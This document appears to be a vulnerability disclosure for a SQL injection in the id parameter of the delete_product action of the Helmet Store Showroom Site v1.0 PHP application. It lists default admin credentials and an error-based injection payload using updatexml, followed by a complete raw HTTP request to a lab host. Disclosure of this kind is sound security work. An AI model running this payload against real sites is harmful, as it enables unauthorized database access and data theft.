# Helmet Store Showroom Site v1.0 by oretnom23 has SQL injection

BUG_Author: HMHYHM

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/15851/helmet-store-showroom-site-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /hss/classes/Master.php?f=delete_product

Vulnerability location: /hss/classes/Master.php?f=delete_product,id

dbname =hss_db,length=6

[+] Payload:  id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+  // Leak place ---> id


```sql
POST /hss/classes/Master.php?f=delete_product HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/hss/admin/?page=products
Content-Length: 65
Cookie: PHPSESSID=29mcgvmjo6mqsepd64ra2rlt4v
Connection: close

id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/204070039-21da45d6-94f2-451c-a3ec-4c58f3f8ea4c.png)
